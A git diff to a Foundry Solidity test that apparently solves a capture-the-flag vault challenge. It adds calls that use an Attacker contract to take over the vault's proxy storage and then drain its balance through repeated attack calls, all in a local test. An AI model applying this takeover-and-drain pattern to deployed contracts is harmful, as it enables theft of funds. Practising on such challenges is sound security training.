@@ -3,9 +3,7 @@ pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
 import "../src/Vault.sol";
-
-
-
+import "../src/Attacker.sol";
 
 contract VaultExploiter is Test {
     Vault public vault;
@@ -30,7 +28,19 @@ contract VaultExploiter is Test {
         vm.deal(palyer, 1 ether);
         vm.startPrank(palyer);
 
+
         // add your hacker code.
+        Attacker attacker = new Attacker(vault);
+        attacker.takeoverAndOpen(bytes32(uint256(uint160(address(logic)))));
+
+        vm.deal(address(attacker), 1 ether);
+        attacker.attack{value: 0.01 ether}(0.01 ether);
+
+        uint256 remaining = address(vault).balance;
+        if(remaining > 0){
+            vm.deal(address(attacker), remaining);
+            attacker.attack{value: remaining}(remaining);
+        }
 
         require(vault.isSolve(), "solved");
         vm.stopPrank();
